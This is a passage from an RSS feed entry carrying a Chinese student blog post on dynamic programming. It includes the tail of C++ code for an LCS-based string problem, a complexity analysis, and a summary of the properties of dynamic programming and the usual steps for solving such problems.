                dp[i][j]&lt;/span&gt;=minval(dp[i-&lt;span&gt;1&lt;/span&gt;][j],dp[i][j-&lt;span&gt;1&lt;/span&gt;],dp[i-&lt;span&gt;1&lt;/span&gt;][j-&lt;span&gt;1&lt;/span&gt;&lt;span&gt;]);
        }
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; dp[lena][lenb];
}

&lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; main()
{
    cin&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt;a;
    getchar();
    cin&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt;b;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; maxss =&lt;span&gt;max(strlen(a),strlen(b));
    
    
    cout&lt;/span&gt;&amp;lt;&amp;lt;maxss-&lt;span&gt;LCS(a,b);
    
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;　　3.4　　算法时间及空间复杂度分析：&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;　　　　由分析易知，时间复杂度和空间复杂度均为O（n^2）&lt;/span&gt;&lt;/p&gt;



&lt;p&gt;&lt;span&gt;　　经过第一次实践合作之后，第二次的实践合作愈发顺利，虽然第三题有一小点WA了，不过还是很合作默契的哈哈。（主要是三木太强了）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;简单通过书本和博客总结了一下动态规划的一些基本特点如下：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;strong&gt;===动态规划问题的特点：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;（1）&lt;strong&gt;&lt;span&gt;最优化原理&lt;/span&gt;&lt;/strong&gt;：如果问题的最优解所包含的子问题的解也是最优的，就称该问题具有最优子结构，即满足最优化原理。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;（2）&lt;strong&gt;&lt;span&gt;重叠子问题&lt;/span&gt;&lt;/strong&gt;：即子问题之间是不独立的，一个子问题在下一阶段决策中可能被多次使用到。（该性质并不是动态规划适用的必要条件，但是如果没有这条性质，动态规划算法同其他算法相比就不具备优势）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;===动规解题的一般思路：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　动态规划所处理的问题是一个多阶段决策问题，一般由初始状态开始，通过对中间阶段决策的选择，达到结束状态。这些决策形成了一个决策序列，同时确定了完成整个过程的一条活动路线(通常是求最优的活动路线)。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　动态规划的设计都有着一定的模式，一般要经历以下几个步骤。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　　　初始状态→│决策１│→│决策２│→…→│决策ｎ│→结束状态&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　 （1）&lt;strong&gt;&lt;span&gt;划分阶段：&lt;/span&gt;&lt;/strong&gt;按照问题的时间或空间特征，把问题分为若干个阶段。在划分阶段时，注意划分后的阶段一定要是有序的或者是可排序的，否则问题就无法求解。    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　 （2）&lt;span&gt;&lt;strong&gt;确定状态和状态变量：&lt;/strong&gt;&lt;/span&gt;将问题发展到各个阶段时所处于的各种客观情况用不同的状态表示出来。当然，状态的选择要满足无后效性。    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　 （3）&lt;strong&gt;&lt;span&gt;确定决策并写出状态转移方程：&lt;/span&gt;&lt;/strong&gt;因为决策和状态转移有着天然的联系，状态转移就是根据上一阶段的状态和决策来导出本阶段的状态。所以如果确定了决策，状态转移方程也就可写出。但事实上常常是反过来做，根据相邻两个阶段的状态之间的关系来确定决策方法和状态转移方程。    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　 （4）&lt;span&gt;&lt;strong&gt;寻找边界条件：&lt;/strong&gt;&lt;/span&gt;给出的状态转移方程是一个递推式，需要一个递推的终止条件或边界条件。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;如有错误不当之处，烦请指正。&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 18 Oct 2019 17:08:00 +0000</pubDate>
<dc:creator>嗨威er</dc:creator>
<og:description>本文索引目录： 一、PTA实验报告题1 ：&amp;#160;数字三角形 1.1 实践题目 1.2 问题描述 1.3 算法描述 1.4 算法时间及空间复杂度分析 二、PTA实验报告题2 ：&amp;#160;最大子段</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/WinniyGD/p/11699866.html</dc:identifier>
</item>
</channel>
</rss>